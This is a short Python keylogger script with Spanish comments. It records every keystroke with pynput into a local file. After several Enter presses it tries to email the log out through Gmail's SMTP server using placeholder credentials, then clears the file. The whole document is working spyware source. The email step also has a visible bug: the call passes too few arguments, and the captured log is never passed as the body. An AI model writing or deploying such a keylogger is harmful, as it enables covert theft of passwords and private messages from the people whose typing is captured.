"""
Created on Mon Aug 1 13:54 2022
@author: Irvi3ngg
"""
from pynput.keyboard import Listener                      
import datetime, smtplib, ssl
from email.message import EmailMessage

file_name="logeos3.txt"                                   
count = 0

def key_listener():                                       
    def key_recorder(key):                                
        global count
        key=str(key)                                      
        print(key)                                        
        write_file(key)                                   
        if key == 'Key.enter':
            count += 1
            print (count)
            if count >= 6:
                EnviarEmail()
                count = 0
        if key == "Key.insert":                           
            print('Saliendo del keylogger...')
            quit()
    with Listener(on_press = key_recorder) as listener:   
        listener.join()                                   


def write_file(keys):                                     
    with open(file_name,'a') as f:                        
        if keys == "Key.enter":                           
            f.write(' -->\n')
        elif keys == 'Key.space':
            f.write(keys.replace('Key.space', ' '))
        elif keys == 'Key.backspace':
            f.write(keys.replace('Key.backspace', '/del/'))
        elif keys == 'Key.shift':
            f.write(keys.replace('Key.shift', '(mayusq)'))
        elif keys == 'Key.ctrl_l':
            f.write(keys.replace('Key.ctrl_l', '(ctrl)'))
        elif keys == 'Key.insert':
            f.write(keys.replace('Key.insert', ' \n\nSaliendo del keylogger3...'))
        else:
            f.write(keys.replace("'", ""))

def EnviarEmail():
    with open(file_name, 'r+') as file:
        fecha = datetime.datetime.now().strftime("%H:%M:%S %d-%m-%Y")
        data = file.read()
        data = 'Log capturado a las: ' + fecha + '\n\n' + data
        crearEmail('your@mail.com','yourpassw','your@mail.com','your subject')
        file.seek(0)
        file.truncate()

def crearEmail(user,passw,recep,subj,body):
    email_passw = passw
    email_emisor = user
    email_receptor = recep
    asunto = subj
    cuerpo = body
    em = EmailMessage()
    em['From'] = email_emisor
    em['To'] = email_receptor
    em['Subject'] = asunto
    em.set_content(cuerpo)
    contexto = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com',465,context=contexto) as smtp:
        smtp.login(email_emisor, email_passw)
        smtp.sendmail(email_emisor, email_receptor, em.as_string())
        smtp.close()

if __name__ == '__main__':
    key_listener()
